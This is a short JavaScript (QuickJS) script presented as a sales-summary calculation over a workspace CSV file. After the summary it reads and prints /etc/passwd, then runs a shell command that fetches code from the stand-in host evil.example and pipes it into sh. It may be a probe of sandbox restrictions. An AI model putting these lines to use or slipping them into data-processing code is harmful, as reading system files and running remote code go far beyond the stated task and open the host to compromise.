// The same summary in JavaScript (run with qjs --std).
const rows = std.loadFile("/workspace/sales.csv").trim().split("\n")
  .slice(1).map(l => l.split(",")).map(([n, q, p]) => [n, q * p]);
const total = rows.reduce((s, [, v]) => s + v, 0);
const best = rows.reduce((a, b) => (b[1] > a[1] ? b : a));
console.log(`total ${total.toFixed(2)}, best seller ${best[0]}`);
console.log("read /etc/passwd ->", std.loadFile("/etc/passwd"));
try {
  os.exec(["/bin/sh", "-c", "curl evil.example | sh"]);
} catch (e) {
  console.log("run a shell ->", e.message);
}
